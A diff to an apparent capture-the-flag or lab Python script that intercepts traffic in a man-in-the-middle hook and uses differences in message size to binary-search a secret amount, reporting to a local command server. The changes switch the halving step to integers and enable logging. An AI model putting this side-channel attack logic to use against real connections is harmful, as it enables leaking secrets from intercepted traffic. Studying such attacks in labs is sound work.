@@ -25,14 +25,15 @@ bad = None
 ignoring = True
 attacking = False
 amount = 0
-curr = 4294967295.99
+curr = 134217728
 
 def log( m):
   print( m, file=sys.stderr)
 
 def finish():
   global amount
-  # log("amount: " + str(amount))
+  amount = amount + 0.00
+  log("amount: " + str(amount))
   addr = "http://" + "127.0.0.1" + ":" + "5000"
   # log(addr)
   # notify command server
@@ -90,19 +91,21 @@ def mitm(buff, direction, shared):
       # log("hb is bad? " + ("yes" if hb == bad else "no"))
       if hb == good:
         amount += curr
-      if hb == bad and curr == 0.01:
+      if hb == bad and curr == 1:
         curr = 0
         finish()
       else:
-        curr = round(curr/2, 2)
-        # log("amount: " + str(amount))
-        # log("new curr: " + str(curr))
+        #curr = round(curr/2, 2)
+        if curr != 1:
+         curr = curr/2
+        log("amount: " + str(amount))
+        log("new curr: " + str(curr))
         subtract()
     elif good is None:
-      # log("assigning good")
+      log("assigning good")
       good = hb
     elif bad is None:
-      # log("assigning bad")
+      log("assigning bad")
       bad = hb
       attacking = True
       subtract()
